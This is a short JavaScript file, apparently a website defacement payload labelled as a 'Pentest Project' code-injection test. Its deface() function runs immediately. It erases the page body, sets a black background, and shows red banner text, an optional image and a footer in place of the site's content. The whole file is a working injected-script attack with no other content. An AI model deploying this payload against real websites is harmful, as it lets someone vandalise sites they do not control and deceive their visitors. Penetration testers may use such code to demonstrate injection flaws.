var title = "Pentest Project";
var bgcolor = "#000000";
var image_url = ""
var text = "Pentest Project Code Injecation ";
var font_color = "#FF0000";
var hack="Pentest Project";

deface(title, bgcolor, image_url, text, font_color);
 
function deface(pageTitle, bgColor, imageUrl, pageText, fontColor) {
  document.title = pageTitle;
  document.body.innerHTML = '';
  document.bgColor = bgColor;
  var overLay = document.createElement("div");
  overLay.style.textAlign = 'center';
  document.body.appendChild(overLay);
  var txt = document.createElement("p");
  txt.style.font = 'normal normal bold 36px Verdana';
  txt.style.color = fontColor;
  txt.innerHTML = pageText;
  overLay.appendChild(txt);
 
  if (image_url != "") {
    var newImg = document.createElement("img");
    newImg.setAttribute("border", '0');
    newImg.setAttribute("src", imageUrl);
    overLay.appendChild(newImg);
  }

  var footer = document.createElement("p");
  footer.style.font = 'italic normal normal 20px Arial';
  footer.style.color = "#FF0000";
  footer.innerHTML = hack;
  overLay.appendChild(footer);
}
